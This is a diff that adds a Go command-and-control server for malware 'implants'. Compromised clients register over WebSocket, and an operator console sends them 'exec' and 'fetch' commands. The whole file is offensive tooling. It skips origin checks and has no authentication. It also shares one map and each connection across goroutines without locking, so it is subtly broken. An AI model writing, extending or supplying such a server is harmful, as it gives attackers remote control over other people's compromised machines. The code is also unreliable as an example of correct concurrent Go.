@@ -1,0 +1,112 @@
+package main
+
+import (
+    "fmt"
+    "log"
+    "net/http"
+    "time"
+    "github.com/gorilla/websocket"
+)
+
+// Struct for implant clients
+type Client struct {
+    ID          string
+    Conn        *websocket.Conn
+    LastCheckin time.Time
+}
+
+// Global map of connected clients
+var clients = make(map[string]*Client)
+
+// Upgrader to handle WebSocket connections
+var upgrader = websocket.Upgrader{
+    ReadBufferSize:  1024,
+    WriteBufferSize: 1024,
+    CheckOrigin: func(r *http.Request) bool {
+        return true // Bypass origin check for simplicity
+    },
+}
+
+// WebSocket handler for implant connections
+func wsHandler(w http.ResponseWriter, r *http.Request) {
+    conn, err := upgrader.Upgrade(w, r, nil)
+    if err != nil {
+        log.Println("WebSocket Upgrade Error:", err)
+        return
+    }
+    defer conn.Close()
+
+    // Read client ID on initial connect
+    _, clientID, err := conn.ReadMessage()
+    if err != nil {
+        log.Println("Client ID Error:", err)
+        return
+    }
+
+    client := &Client{ID: string(clientID), Conn: conn, LastCheckin: time.Now()}
+    clients[client.ID] = client
+    log.Printf("Client connected: %s", client.ID)
+
+    // Listen for incoming messages from implant
+    for {
+        messageType, message, err := conn.ReadMessage()
+        if err != nil {
+            log.Printf("Client %s disconnected: %v", client.ID, err)
+            delete(clients, client.ID)
+            break
+        }
+        log.Printf("Received from %s: %s", client.ID, message)
+
+        // Echo message back as confirmation (modify to handle real commands)
+        if err := conn.WriteMessage(messageType, message); err != nil {
+            log.Printf("Send to %s failed: %v", client.ID, err)
+            break
+        }
+    }
+}
+
+// Command dashboard for operators
+func commandDashboard() {
+    for {
+        fmt.Println("\n=== C2 Dashboard ===")
+        fmt.Println("Connected Clients:")
+        for id, client := range clients {
+            fmt.Printf("ID: %s | Last Check-in: %s\n", id, client.LastCheckin)
+        }
+
+        // Prompt operator for command input
+        var clientID, command string
+        fmt.Print("Enter Client ID: ")
+        fmt.Scanln(&clientID)
+        fmt.Print("Enter Command (ping, exec, fetch): ")
+        fmt.Scanln(&command)
+
+        // Send command to client if connected
+        client, exists := clients[clientID]
+        if exists {
+            if err := client.Conn.WriteMessage(websocket.TextMessage, []byte(command)); err != nil {
+                log.Println("Command send error:", err)
+            } else {
+                log.Printf("Sent command '%s' to %s", command, clientID)
+            }
+        } else {
+            log.Println("Client not connected.")
+        }
+
+        time.Sleep(1 * time.Second)
+    }
+}
+
+func main() {
+    // WebSocket route
+    http.HandleFunc("/ws", wsHandler)
+
+    // Run server
+    go func() {
+        log.Println("C2 server started on :8080")
+        log.Fatal(http.ListenAndServe(":8080", nil))
+    }()
+
+    // Run command dashboard
+    commandDashboard()
+}
